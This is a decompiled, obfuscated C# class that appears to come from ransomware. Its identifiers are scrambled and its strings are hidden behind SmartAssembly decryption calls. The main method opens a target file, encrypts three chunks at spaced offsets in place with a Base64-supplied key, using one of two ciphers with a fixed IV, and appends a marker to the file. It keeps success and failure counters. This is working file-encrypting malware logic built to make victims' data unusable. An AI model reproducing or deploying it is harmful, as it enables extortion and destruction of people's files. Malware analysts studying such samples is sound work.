using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using leLftCXICzmTes;

namespace uBrdXrCSgnwM;

internal sealed class WngNyaOwcSGdLP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int iaLgHOsJXgHtXR(long long_0)
	{
		return (int)long_0;
	}

	public static bool MaLriMjWjsJEaP(string ioqzDkukcmJh, string ekbDARzsFEgj, string HaSWtquEmOL, byte[] frDoOycJsFluhgdvD = null, byte[] xwLYCUebSGevDz = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(ioqzDkukcmJh, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = iaLgHOsJXgHtXR(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(ekbDARzsFEgj) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(ekbDARzsFEgj) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(ekbDARzsFEgj) * 1024 * 1024) / 10;
				}
				int nmbKkZBQQid = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = RjcOeXHqaMfiUn(ioqzDkukcmJh, fileStream, nmbKkZBQQid, num * i);
					array = (hWHDXjXKuyuXQ.OIyyeuNoRzhHTwe ? GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(HaSWtquEmOL), xwLYCUebSGevDz) : zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(HaSWtquEmOL), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					NVcAekYuNmQ(ioqzDkukcmJh, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = ((!hWHDXjXKuyuXQ.MFCrMNyVwftIF) ? (hWHDXjXKuyuXQ.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107409442)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410415)) + Convert.ToString(ekbDARzsFEgj) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410415))) : Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107409487)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410415)) + Convert.ToString(ekbDARzsFEgj) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410415)))) : (hWHDXjXKuyuXQ.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107409429)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410361)) + Convert.ToString(ekbDARzsFEgj) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410361))) : Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107409487)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410361)) + Convert.ToString(ekbDARzsFEgj) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410361)))));
			if (!hWHDXjXKuyuXQ.MFCrMNyVwftIF)
			{
				using FileStream fileStream2 = new FileStream(ioqzDkukcmJh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(ioqzDkukcmJh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(frDoOycJsFluhgdvD, 0, frDoOycJsFluhgdvD.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (hWHDXjXKuyuXQ.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(hWHDXjXKuyuXQ.LImNkSPhwOOQHW, getString_0(107387482) + ioqzDkukcmJh + getString_0(107409448) + ex.Message + getString_0(107395866));
				}
				catch (Exception)
				{
				}
			}
			hWHDXjXKuyuXQ.gmdqiJfLiKSG++;
			return false;
		}
		hWHDXjXKuyuXQ.DnHtYVwZFeaR++;
		return true;
	}

	public static byte[] RjcOeXHqaMfiUn(string RsrHeKyHwMStY, FileStream EilTxqNhCUKjIy, int NmbKkZBQQid, int MbQLtjvVBgOUVT = 0)
	{
		byte[] array = new byte[NmbKkZBQQid];
		EilTxqNhCUKjIy.Position = MbQLtjvVBgOUVT;
		EilTxqNhCUKjIy.Read(array, 0, NmbKkZBQQid);
		return array;
	}

	public static void NVcAekYuNmQ(string BingBzUIqmuy, FileStream QNyNHpfnYDPsrk, byte[] LQjfNpkcDq, int WlfeOaQBofbWJ = 0)
	{
		QNyNHpfnYDPsrk.Position = WlfeOaQBofbWJ;
		QNyNHpfnYDPsrk.Write(LQjfNpkcDq, 0, LQjfNpkcDq.Length);
	}

	static WngNyaOwcSGdLP()
	{
		Strings.CreateGetStringDelegate(typeof(WngNyaOwcSGdLP));
	}
}
